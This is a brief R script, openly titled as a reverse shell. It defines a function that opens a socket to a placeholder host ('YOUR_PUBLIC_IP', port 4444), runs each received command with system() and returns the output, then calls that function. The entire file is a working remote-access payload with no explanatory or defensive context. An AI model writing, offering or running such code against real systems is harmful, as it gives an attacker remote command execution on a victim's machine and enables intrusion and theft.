# Load necessary libraries
library(socket)

# Function to create a reverse shell
reverse_shell <- function(host, port) {
  con <- socketConnection(host, port, server = FALSE)
  while(TRUE) {
    command <- readLines(con, n = 1)
    if (command == "exit") break
    output <- system(command, intern = TRUE)
    writeLines(output, con)
  }
  close(con)
}

# Call the function with the target IP and port
reverse_shell("YOUR_PUBLIC_IP", 4444)
